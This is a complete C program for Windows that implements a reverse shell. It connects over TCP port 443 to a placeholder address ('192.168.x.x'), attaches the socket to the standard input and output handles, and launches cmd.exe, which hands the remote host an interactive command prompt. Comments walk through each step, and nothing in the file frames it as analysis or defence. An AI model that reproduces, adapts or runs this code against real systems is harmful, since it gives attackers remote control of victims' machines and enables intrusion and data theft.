#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 0), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, 0);

    // Setup our sockaddr_in structure
    sa.sin_family = AF_INET;
    sa.sin_port = htons(443); // Port 443
    sa.sin_addr.s_addr = inet_addr("192.168.x.x"); // IP

    // Establish the connection to the remote host
    WSAConnect(s, (SOCKADDR*)&sa, sizeof(sa), NULL, NULL, NULL, NULL);

    // Redirect stdin, stdout, and stderr to the socket
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    // Start cmd.exe
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    // Wait until child process exits
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Clean up and exit
    closesocket(s);
    WSACleanup();

    return 0;
}
